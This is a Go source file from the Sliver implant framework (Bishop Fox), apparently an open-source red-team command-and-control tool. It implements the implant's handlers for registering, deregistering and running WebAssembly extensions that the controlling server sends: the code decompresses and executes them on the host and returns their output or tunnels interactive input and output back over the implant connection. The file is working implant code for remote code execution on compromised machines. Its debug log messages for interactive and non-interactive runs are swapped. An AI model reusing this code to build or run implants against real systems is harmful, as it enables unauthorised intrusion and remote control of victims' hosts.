package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2023  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (

	// {{if .Config.Debug}}

	"io"
	"log"

	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/extension"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
	"google.golang.org/protobuf/proto"
)

var wasmExtensionCache = map[string]*pb.RegisterWasmExtensionReq{}

// *** RPC Handlers ***

// registerWasmExtensionHandler - Load a Wasm extension
func registerWasmExtensionHandler(data []byte, resp RPCResponse) {
	wasmExtReq := &pb.RegisterWasmExtensionReq{}
	err := proto.Unmarshal(data, wasmExtReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	// Cache the Wasm extension in the map until we receive a
	// MsgExecWasmExtensionReq message
	wasmExtensionCache[wasmExtReq.Name] = wasmExtReq

	wasmExt, _ := proto.Marshal(&pb.RegisterWasmExtension{Response: &commonpb.Response{}})
	resp(wasmExt, nil)
}

// deregisterWasmExtensionHandler - Unload a Wasm extension
func deregisterWasmExtensionHandler(data []byte, resp RPCResponse) {
	wasmExtReq := &pb.DeregisterWasmExtensionReq{}
	err := proto.Unmarshal(data, wasmExtReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	// Remove the Wasm extension from the map
	errMsg := ""
	if _, ok := wasmExtensionCache[wasmExtReq.Name]; ok {
		delete(wasmExtensionCache, wasmExtReq.Name)
	} else {
		errMsg = "Wasm extension not registered"
	}
	wasmExt, _ := proto.Marshal(&pb.RegisterWasmExtension{
		Response: &commonpb.Response{Err: errMsg},
	})
	resp(wasmExt, nil)
}

// *** TunnelHandler ***

// execWasmExtensionHandler - Execute a Wasm extension
func execWasmExtensionHandler(envelope *pb.Envelope, connection *transports.Connection) {
	req := &pb.ExecWasmExtensionReq{}
	err := proto.Unmarshal(envelope.Data, req)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	extReq, ok := wasmExtensionCache[req.Name]
	if !ok {
		// {{if .Config.Debug}}
		log.Printf("Wasm extension '%s' not found", req.Name)
		// {{end}}
		return
	}

	wasmExtRuntime, err := extension.NewWasmExtension(extReq.Name, encoders.GunzipBuf(extReq.WasmGz), extReq.MemFS)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error creating wasm extension: %v", err)
		// {{end}}
		return
	}

	var data []byte
	if req.Interactive {
		runInteractive(req, connection, wasmExtRuntime)
	} else {
		data, _ = runNonInteractive(req, wasmExtRuntime)
	}
	connection.Send <- &pb.Envelope{
		ID:   envelope.ID,
		Type: pb.MsgExecWasmExtension,
		Data: data,
	}
}

func runNonInteractive(req *pb.ExecWasmExtensionReq, wasm *extension.WasmExtension) ([]byte, error) {
	// {{if .Config.Debug}}
	log.Printf("Executing interactive wasm extension")
	// {{end}}
	exitCode, err := wasm.Execute(req.Args)
	errMsg := ""
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error executing wasm extension: %v", err)
		// {{end}}
		errMsg = err.Error()
	}
	return proto.Marshal(&pb.ExecWasmExtension{
		Stdout:   wasm.Stdout.Bytes(),
		Stderr:   wasm.Stderr.Bytes(),
		ExitCode: exitCode,
		Response: &commonpb.Response{Err: errMsg},
	})
}

// Wraps the bytes.Buffer with a Close() method
type WasmStdin struct {
	wasm *extension.WasmExtension
}

func (w *WasmStdin) Write(p []byte) (n int, err error) {
	return w.wasm.Stdin.Write(p)
}

func (w *WasmStdin) Close() error {
	return w.wasm.Close()
}

func runInteractive(req *pb.ExecWasmExtensionReq, conn *transports.Connection, wasm *extension.WasmExtension) {
	// {{if .Config.Debug}}
	log.Printf("Executing non-interactive wasm extension")
	// {{end}}

	tunnel := transports.NewTunnel(
		req.TunnelID,
		&WasmStdin{wasm: wasm},
		io.NopCloser(wasm.Stdout),
		io.NopCloser(wasm.Stderr),
	)
	conn.AddTunnel(tunnel)

}
